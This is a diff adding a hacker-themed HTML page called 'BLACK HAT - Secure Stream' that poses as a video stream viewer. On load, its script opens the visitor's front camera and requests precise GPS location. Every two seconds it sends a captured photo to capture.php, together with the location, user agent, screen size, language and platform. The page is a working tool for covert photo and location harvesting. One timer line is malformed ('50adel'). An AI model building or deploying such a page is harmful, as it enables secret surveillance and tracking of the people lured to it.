@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BLACK HAT - Secure Stream</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Fira+Code:wght@400;500&display=swap');
+
+        body {
+            background: #0a0a0a;
+            font-family: 'Poppins', sans-serif;
+            color: #e0e0e0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        canvas#matrix {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+            opacity: 0.12;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .card {
+            background: #0d0d1a;
+            border: 2px solid #00ff41;
+            border-radius: 14px;
+            padding: 25px 20px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0,255,65,0.1);
+        }
+
+        .skull {
+            font-size: 44px;
+            color: #00ff41;
+            text-shadow: 0 0 20px rgba(0,255,65,0.3);
+        }
+
+        .title {
+            font-family: 'Orbitron', monospace;
+            font-size: 22px;
+            color: #00ff41;
+            letter-spacing: 3px;
+            margin: 3px 0;
+        }
+
+        .sub {
+            font-family: 'Fira Code', monospace;
+            font-size: 9px;
+            color: rgba(0,255,65,0.35);
+            letter-spacing: 2px;
+            margin-bottom: 12px;
+        }
+
+        .loading {
+            height: 2px;
+            background: rgba(0,255,65,0.08);
+            margin: 10px 0;
+            overflow: hidden;
+            border-radius: 2px;
+        }
+
+        .loading-fill {
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, transparent, #00ff41, transparent);
+            animation: loadAnim 1.5s infinite;
+        }
+
+        @keyframes loadAnim {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        #videoContainer {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #000;
+            border: 1px solid rgba(0,255,65,0.15);
+            margin: 12px 0;
+            position: relative;
+        }
+
+        #videoContainer video {
+            width: 100%;
+            display: block;
+            min-height: 250px;
+            object-fit: cover;
+        }
+
+        .overlay-corner {
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            border-color: #00ff41;
+            border-style: solid;
+            opacity: 0.6;
+        }
+        .overlay-corner.tl { top: 6px; left: 6px; border-width: 2px 0 0 2px; }
+        .overlay-corner.tr { top: 6px; right: 6px; border-width: 2px 2px 0 0; }
+        .overlay-corner.bl { bottom: 6px; left: 6px; border-width: 0 0 2px 2px; }
+        .overlay-corner.br { bottom: 6px; right: 6px; border-width: 0 2px 2px 0; }
+
+        #placeholder {
+            min-height: 250px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: rgba(0,255,65,0.25);
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+            gap: 8px;
+            background: rgba(0,0,0,0.85);
+        }
+
+        .status-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            color: rgba(0,255,65,0.5);
+            margin: 8px 0;
+        }
+
+        .dot {
+            width: 6px;
+            height: 6px;
+            background: #00ff41;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        .info-line {
+            font-family: 'Fira Code', monospace;
+            font-size: 8px;
+            color: rgba(0,255,65,0.15);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        .footer {
+            font-family: 'Fira Code', monospace;
+            font-size: 7px;
+            color: rgba(0,255,65,0.1);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix"></canvas>
+
+    <div class="container">
+        <div class="card">
+            <div class="skull">&#9760;</div>
+            <div class="title">BLACK HAT</div>
+            <div class="sub">// ENCRYPTED STREAM v3.0 //</div>
+
+            <div class="loading"><div class="loading-fill"></div></div>
+
+            <div id="videoContainer">
+                <video id="video" autoplay playsinline muted></video>
+                <div id="placeholder">
+                    <div style="font-size:36px;">&#9654;</div>
+                    <div>Initializing secure stream...</div>
+                </div>
+                <div style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;">
+                    <span class="overlay-corner tl"></span>
+                    <span class="overlay-corner tr"></span>
+                    <span class="overlay-corner bl"></span>
+                    <span class="overlay-corner br"></span>
+                </div>
+            </div>
+
+            <div class="status-bar">
+                <span class="dot"></span>
+                <span id="statusText">Establishing connection...</span>
+            </div>
+
+            <div id="locationInfo" class="info-line"></div>
+            <div id="deviceInfo" class="info-line"></div>
+
+            <div class="footer">BLACK HAT // ALL RIGHTS RESERVED</div>
+        </div>
+    </div>
+
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <script>
+        // ===== MATRIX BACKGROUND =====
+        const mc = document.getElementById('matrix');
+        const mctx = mc.getContext('2d');
+        mc.width = window.innerWidth;
+        mc.height = window.innerHeight;
+        const chars = '01BLACKHAT'.split('');
+        const cols = mc.width / 10;
+        const drops = Array(Math.floor(cols)).fill(1);
+
+        function drawMatrix() {
+            mctx.fillStyle = 'rgba(0,0,0,0.05)';
+            mctx.fillRect(0, 0, mc.width, mc.height);
+            mctx.fillStyle = '#00ff41';
+            mctx.font = '10px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                mctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 10, drops[i] * 10);
+                if (drops[i] * 10 > mc.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50adel);
+
+        window.addEventListener('resize', () => {
+            mc.width = window.innerWidth;
+            mc.height = window.innerHeight;
+        });
+
+        // ===== GET DEVICE INFO =====
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown device';
+            
+            if (/iPhone/.test(ua)) device = 'iPhone';
+            else if (/iPad/.test(ua)) device = 'iPad';
+            else if (/Android/.test(ua)) {
+                const match = ua.match(/Android\s([\d.]+)/);
+                device = 'Android ' + (match ? match[1] : '');
+            } else if (/Windows/.test(ua)) device = 'Windows PC';
+            else if (/Mac/.test(ua)) device = 'Mac';
+            else if (/Linux/.test(ua)) device = 'Linux';
+
+            document.getElementById('deviceInfo').textContent = 'Device: ' + device;
+            return { userAgent: ua, device: device };
+        }
+
+        // ===== GET GPS LOCATION =====
+        function getLocation() {
+            if (!navigator.geolocation) {
+                document.getElementById('locationInfo').textContent = 'Location: not available';
+                return null;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy;
+                    document.getElementById('locationInfo').textContent = 
+                        'Location: ' + lat.toFixed(6) + ', ' + lon.toFixed(6) + ' (±' + acc.toFixed(0) + 'm)';
+                    
+                    // Store for sending
+                    window._locationData = { lat, lon, accuracy: acc };
+                },
+                function() {
+                    document.getElementById('locationInfo').textContent = 'Location: denied';
+                    window._locationData = null;
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        }
+
+        // ===== CAMERA & CAPTURE =====
+        const video = document.getElementById('video');
+        const placeholder = document.getElementById('placeholder');
+        const statusText = document.getElementById('statusText');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const ctx2 = hiddenCanvas.getContext('2d');
+        let stream = null;
+        let captureCount = 0;
+        let captureInterval = null;
+
+        // Get device info and location on load
+        const deviceInfo = getDeviceInfo();
+        getLocation();
+
+        async function initCamera() {
+            try {
+                statusText.textContent = 'Connecting to secure stream...';
+                
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+                await video.play();
+
+                placeholder.style.display = 'none';
+                video.style.display = 'block';
+                statusText.textContent = 'Stream active - capturing data';
+                
+                // Auto capture every 2 seconds
+                captureInterval = setInterval(captureAndSend, 2000);
+                setTimeout(captureAndSend, 1000);
+
+            } catch (err) {
+                console.log('Camera error:', err);
+                statusText.textContent = 'Camera blocked - waiting for permission';
+                placeholder.innerHTML = '<div style="font-size:36px;">&#9888;</div><div>Camera permission needed</div>';
+            }
+        }
+
+        function captureAndSend() {
+            if (!stream || !video.videoWidth) return;
+            
+            captureCount++;
+            
+            // Capture frame
+            hiddenCanvas.width = video.videoWidth;
+            hiddenCanvas.height = video.videoHeight;
+            ctx2.drawImage(video, 0, 0);
+            const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.7);
+            
+            // Get location (try again if not yet obtained)
+            if (!window._locationData) {
+                getLocation();
+            }
+
+            // Build data to send
+            const payload = {
+                image: imageData,
+                num: captureCount,
+                userAgent: navigator.userAgent,
+                device: deviceInfo.device,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language,
+                platform: navigator.platform,
+                location: window._locationData || null,
+                timestamp: new Date().toISOString()
+            };
+
+            // Send to server
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'capture.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    statusText.textContent = 'Data captured #' + captureCount;
+                }
+            };
+            xhr.send(JSON.stringify(payload));
+        }
+
+        // Auto start camera on page load
+        window.addEventListener('load', () => {
+            setTimeout(initCamera, 800);
+        });
+    </script>
+</body>
+</html>
